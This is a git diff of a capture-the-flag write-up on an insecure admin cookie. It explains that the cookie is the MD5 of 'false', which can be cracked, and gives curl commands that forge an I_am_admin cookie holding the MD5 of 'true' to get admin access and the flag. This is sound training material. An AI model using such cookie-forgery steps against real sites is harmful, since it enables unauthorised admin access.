@@ -1,27 +1,43 @@
 # Insecure admin cookie authentication
 
 ## 📖 Vulnerability Explanation
-The token used to authenticate as an admin in the page is an md5 hash. If we crack it, the value is "false". We can generate a new token with the md5 hash of the string "true" to authenticate as the admin user.
+The admin cookie is set to a static hash value, which can be modified by the user. This can lead to unauthorized access to admin protected resources.
 
 ## ⚙️ Exploitation Process
-Get the hash and crack it. You can use system tools, such as ```john``` or ```hashcat```, or online services. We used ```https://crackstation.net/``` and it revealed the value for the md5 hash was the string "false".
+The token used to authenticate as an admin in the page is an md5 hash. 
 
-- We can retrieve the token value using curl:
-```
-curl -s -I 'http://localhost:9090/index.php'
-```
+In order to crack it, we can use system tools, such as ```john``` or ```hashcat```, or online services. We chose https://crackstation.net/ and it revealed that the value for the md5 hash was the string "false".
+
+We can generate a new token with the md5 hash of the string "true" to authenticate as the admin user.
+
 ---
-- Check the hash value:
+
+**1. Retrieve the token value using curl**
+
+```
+curl -s -I 'http://BornToSec.com/index.php'
+```
+
+---
+
+**2. Check the hash value**
+
 ![](./CrackStation.png)
+
 ---
-- Generate the new hash for the token:
+
+**3. Generate the new hash for the token:**
+
 ```
 echo -n 'true' | md5sum
 ```
+
 ---
-- Setting the value to the hash of the string "true" gives us the flag:
+
+**4. Setting the value to the hash of the string "true" gives us the flag:**
+
 ```
-curl -s -H 'Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09' 'http://localhost:9090/index.php' | grep Flag
+curl -s -H 'Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09' 'http://BornToSec.com/index.php' | grep Flag
 ```
 
 ## 🧰 Additional Resources Used
